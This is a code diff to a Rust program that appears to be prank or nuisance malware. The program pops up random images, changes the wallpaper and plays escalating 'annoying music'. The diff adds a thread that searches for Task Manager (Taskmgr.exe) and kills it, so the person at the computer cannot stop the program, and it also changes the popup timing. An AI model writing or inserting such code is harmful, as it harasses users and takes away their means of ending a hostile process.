@@ -9,6 +9,7 @@ mod wallpaper;
 mod play_music;
 mod utils;
 mod popups;
+mod kill_process;
 
 fn main() {
     let iterations: usize = 240;
@@ -37,7 +38,16 @@ fn main() {
     .collect();
 
     thread::spawn(move || {
-        popups::popup_images_randomly(image_paths, iterations, 1, 10);
+        /* Names of processes to look for and kill */
+        let target_processes = &[
+            "Taskmgr.exe"
+        ];
+    
+        kill_process::kill_processes(target_processes)
+    });
+
+    thread::spawn(move || {
+        popups::popup_images_randomly(image_paths, iterations, 3000, 10000);
     });
 
     /* Play annoying music with increasing speed and crescendo */
